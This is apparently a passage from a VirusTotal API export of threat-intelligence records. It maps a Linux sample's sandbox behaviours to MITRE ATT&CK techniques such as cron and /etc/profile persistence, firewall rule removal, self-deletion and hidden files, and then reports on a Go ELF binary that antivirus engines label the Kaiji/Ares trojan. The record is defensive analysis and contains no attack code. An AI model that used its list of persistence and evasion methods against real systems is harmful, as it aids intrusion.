                    "severity": "LOW",
                    "description": "Found strings indicative of a multi-platform dropper"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"rm\" command used to delete files or directories"
                  },
                  {
                    "severity": "LOW",
                    "description": "Sample deletes itself"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/004/",
                "id": "T1070.004",
                "name": "File Deletion"
              },
              {
                "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample removes firewall rules"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/004/",
                "id": "T1562.004",
                "name": "Disable or Modify System Firewall"
              },
              {
                "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Writes ELF files to hidden directories"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates hidden files, links and/or directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/001/",
                "id": "T1564.001",
                "name": "Hidden Files and Directories"
              },
              {
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample tries to set the executable flag"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes the \"chmod\" command used to modify permissions"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1222/",
                "id": "T1222",
                "name": "File and Directory Permissions Modification"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using cron"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Executes the \"crontab\" command typically for achieving persistence"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/",
                "id": "T1053",
                "name": "Scheduled Task/Job"
              },
              {
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). \nInside the .service unit files, the following directives are used to execute commands:  \n\nExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.\nExecReload directive executes when a service restarts. \nExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a .service file’s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"systemctl\" command used for controlling the systemd system and service manager"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/002/",
                "id": "T1543.002",
                "name": "Systemd Service"
              },
              {
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using /etc/profile"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1546/004/",
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Enumerates processes within the \"proc\" file system"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1003/",
                "id": "T1003",
                "name": "OS Credential Dumping"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f5c7247565d4a4ddeeed"
  },
  "data": {
    "attributes": {
      "goresym": {
        "report_preview": {
          "buildId": "lrmQfLs227knIQnK5Xs0/B1VnVw3vqYb_bMvCA0-v/uYzP95X-AnQHK3sN6tVj/IPzQQJcFz6nFQ41t-y4n",
          "arch": "amd64",
          "version": "1.20.2",
          "os": "linux",
          "buildInfo": {
            "path": "linux",
            "settings": [
              {
                "key": "-buildmode",
                "value": "exe"
              },
              {
                "key": "-compiler",
                "value": "gc"
              },
              {
                "key": "-ldflags",
                "value": "\"-s -w\""
              },
              {
                "key": "CGO_ENABLED",
                "value": "0"
              },
              {
                "key": "GOARCH",
                "value": "amd64"
              },
              {
                "key": "GOOS",
                "value": "linux"
              },
              {
                "key": "GOAMD64",
                "value": "v1"
              }
            ],
            "deps": [
              {
                "path": "golang.org/x/crypto",
                "version": "v0.7.0"
              }
            ],
            "goVersion": "go1.20.2"
          }
        },
        "summary": {
          "total_userFunctions": 1397,
          "total_stdFunctions": 3868,
          "total_dependencies": 1,
          "total_interfaces": 6425,
          "total_types": 21645,
          "total_files": 598
        }
      },
      "type_description": "ELF",
      "tlsh": "T1F9463903F85195E8D1AAD130CA6282A2BB717C895B3023E33F55F7B82F72BD45A79354",
      "vhash": "0bdb6897e2cfae6ac376e9ab86226fb1",
      "type_tags": [
        "executable",
        "linux",
        "elf"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.",
          "source": "https://github.com/InQuest/yara-rules-vt",
          "author": "InQuest Labs",
          "ruleset_name": "Windows_API_Function",
          "rule_name": "Windows_API_Function",
          "ruleset_id": "0122a7f913"
        }
      ],
      "telfhash": "t106a20eb446bd34f5a666c551f3b274b4e63318b563e874b10037bc92efe0e891ca6827",
      "names": [
        "A64"
      ],
      "last_modification_date": 1687812404,
      "type_tag": "elf",
      "elf_info": {
        "header": {
          "hdr_version": "1 (current)",
          "type": "EXEC (Executable file)",
          "num_prog_headers": 7,
          "obj_version": "0x1",
          "machine": "Advanced Micro Devices X86-64",
          "num_section_headers": 14,
          "os_abi": "UNIX - System V",
          "abi_version": 0,
          "entrypoint": 4616224,
          "data": "2's complement, little endian",
          "class": "ELF64"
        },
        "section_list": [
          {
            "name": "",
            "section_type": "NULL",
            "virtual_address": 0,
            "physical_offset": 0,
            "flags": "",
            "size": 0
          },
          {
            "name": ".text",
            "section_type": "PROGBITS",
            "virtual_address": 4198400,
            "physical_offset": 4096,
            "flags": "AX",
            "size": 2579286
          },
          {
            "name": ".rodata",
            "section_type": "PROGBITS",
            "virtual_address": 6778880,
            "physical_offset": 2584576,
            "flags": "A",
            "size": 1002804
          },
          {
            "name": ".shstrtab",
            "section_type": "STRTAB",
            "virtual_address": 0,
            "physical_offset": 3587392,
            "flags": "",
            "size": 152
          },
          {
            "name": ".typelink",
            "section_type": "PROGBITS",
            "virtual_address": 7781856,
            "physical_offset": 3587552,
            "flags": "A",
            "size": 5716
          },
          {
            "name": ".itablink",
            "section_type": "PROGBITS",
            "virtual_address": 7787584,
            "physical_offset": 3593280,
            "flags": "A",
            "size": 2312
          },
          {
            "name": ".gosymtab",
            "section_type": "PROGBITS",
            "virtual_address": 7789896,
            "physical_offset": 3595592,
            "flags": "A",
            "size": 0
          },
          {
            "name": ".gopclntab",
            "section_type": "PROGBITS",
            "virtual_address": 7789920,
            "physical_offset": 3595616,
            "flags": "A",
            "size": 1420392
          },
          {
            "name": ".go.buildinfo",
            "section_type": "PROGBITS",
            "virtual_address": 9211904,
            "physical_offset": 5017600,
            "flags": "WA",
            "size": 320
          },
          {
            "name": ".noptrdata",
            "section_type": "PROGBITS",
            "virtual_address": 9212224,
            "physical_offset": 5017920,
            "flags": "WA",
            "size": 335712
          },
          {
            "name": ".data",
            "section_type": "PROGBITS",
            "virtual_address": 9547936,
            "physical_offset": 5353632,
            "flags": "WA",
            "size": 44816
          },
          {
            "name": ".bss",
            "section_type": "NOBITS",
            "virtual_address": 9592768,
            "physical_offset": 5398464,
            "flags": "WA",
            "size": 200256
          },
          {
            "name": ".noptrbss",
            "section_type": "NOBITS",
            "virtual_address": 9793024,
            "physical_offset": 5598720,
            "flags": "WA",
            "size": 26576
          },
          {
            "name": ".note.go.buildid",
            "section_type": "NOTE",
            "virtual_address": 4198300,
            "physical_offset": 3996,
            "flags": "A",
            "size": 100
          }
        ],
        "segment_list": [
          {
            "segment_type": "PHDR",
            "resources": []
          },
          {
            "segment_type": "NOTE",
            "resources": [
              ".note.go.buildid"
            ]
          },
          {
            "segment_type": "LOAD",
            "resources": [
              ".text",
              ".note.go.buildid"
            ]
          },
          {
            "segment_type": "LOAD",
            "resources": [
              ".rodata",
              ".shstrtab",
              ".typelink",
              ".itablink",
              ".gosymtab",
              ".gopclntab"
            ]
          },
          {
            "segment_type": "LOAD",
            "resources": [
              ".go.buildinfo",
              ".noptrdata",
              ".data",
              ".bss",
              ".noptrbss"
            ]
          },
          {
            "segment_type": "GNU_STACK",
            "resources": []
          },
          {
            "segment_type": "<unknown>",
            "resources": []
          }
        ]
      },
      "times_submitted": 3,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 5398528,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.kaiji/ares",
        "popular_threat_category": [
          {
            "count": 20,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 8,
            "value": "kaiji"
          },
          {
            "count": 3,
            "value": "ares"
          },
          {
            "count": 2,
            "value": "r002c0xer23"
          }
        ]
      },
      "detectiteasy": {
        "filetype": "ELF64",
        "values": [
          {
            "info": "EXEC AMD64-64",
            "version": "1.10.x-1.17.x",
            "type": "Compiler",
            "name": "Go"
          }
        ]
      },
      "last_submission_date": 1687272289,
      "reputation": -1,
      "trid": [
        {
          "file_type": "ELF Executable and Linkable format (Linux)",
          "probability": 50.1
        },
        {
          "file_type": "ELF Executable and Linkable format (generic)",
          "probability": 49.8
        }
      ],
      "sandbox_verdicts": {
        "Yomi Hunter": {
          "category": "harmless",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "CLEAN"
          ]
        }
      },
      "sha256": "447431333b2c2a72ac213a9fa2da8c2b09383ae75c3b31a88acfa79b8d43b8d8",
      "tags": [
        "64bits",
        "elf",
        "long-sleeps",
        "persistence",
        "detect-debug-environment"
      ],
      "last_analysis_date": 1687805128,
      "unique_sources": 3,
      "first_submission_date": 1682879630,
      "ssdeep": "49152:36YAazFaGdD95S9rb/T0vO90d7HjmAFd4A64nsfJSNi2nYr3miNAbBlrqlTMcN7j:ldvpJYrjAGENL",
      "md5": "29b9cdf5bcf281bc7bdc8b41575e0432",
      "sha1": "8ec4a7a52c65bb8928c24919c6661d44532c37d5",
      "magic": "ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=lrmQfLs227knIQnK5Xs0/B1VnVw3vqYb_bMvCA0-v/uYzP95X-AnQHK3sN6tVj/IPzQQJcFz6nFQ41t-y4n, stripped",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 13,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 1,
        "malicious": 33,
        "undetected": 28
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Elastic": {
          "category": "undetected",
          "engine_name": "Elastic",
          "engine_version": "4.0.95",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230620"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.Linux.Generic.298884",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.1.0.0",
          "result": "Unix.Malware.Kaiji-10003730-0",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230619"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Zillya": {
          "category": "failure",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4901",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.93.48764",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.93.48760",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Linux.Generic.D48F84",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.477",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Cyren": {
          "category": "undetected",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Trojan.Gen.NPE",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "27472",
          "result": "a variant of Linux/Kaiji.J",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.426",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_GEN.R002C0XER23",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "22.11.7701.0",
          "result": "ELF:Ares-C [Bot]",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.Linux.Agent.ne",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.Linux.Generic.298884",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25785",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Linux.Trojan.Agent.Ymhl",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Mal/Generic-S",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Malware.LINUX/Kaiji..zvmfp",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.59.12300",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.Linux.Generic.298884",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_GEN.R002C0XER23",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": "Artemis!Trojan",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.446",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230412"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.Linux.Generic.298884",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.Linux.Generic.298884 (B)",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.2.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230404"
        },
        "Avast-Mobile": {
          "category": "malicious",
          "engine_name": "Avast-Mobile",
          "engine_version": "230626-00",
          "result": "ELF:Kaiji-R [Trj]",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan.Linux.dgh",
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "LINUX/Kaiji..zvmfp",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=82)",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/Linux.Kaiji.j",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.125.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "35771",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23050.3",
          "result": "Trojan:Linux/Multiverze",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230622"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Linux.Agent.ne",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36098B:27.32197",
          "result": "Trojan.Linux.Generic.298884",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1687802425",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.23.3.10396",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.114",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230219"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230621"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.Linux.Generic.298884",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-06-26.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
